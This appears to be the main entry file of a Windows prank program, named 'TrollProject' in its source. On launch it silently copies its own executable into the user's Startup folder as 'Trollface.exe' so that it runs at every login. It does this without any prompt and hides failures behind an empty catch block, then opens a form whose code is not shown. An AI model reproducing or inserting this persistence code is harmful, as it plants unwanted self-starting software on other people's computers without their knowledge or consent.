using System;
using System.IO;
using System.Windows.Forms;

namespace TrollProject
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            /// <summary>
            /// Auto-starts the appication when you start up your computer.
            /// </summary>
            try
            {
                var executableName = AppDomain.CurrentDomain.FriendlyName;
                var startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                var myPath = AppDomain.CurrentDomain.BaseDirectory;
                var myFullPath = myPath + "\\" + executableName;

                var autostartPath = startupFolder + "\\" + "Trollface.exe";

                if (!File.Exists(autostartPath))
                {
                    File.Copy(myFullPath, autostartPath);
                }
            }
            catch (Exception) { }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new EntryFRM());
        }
    }
}
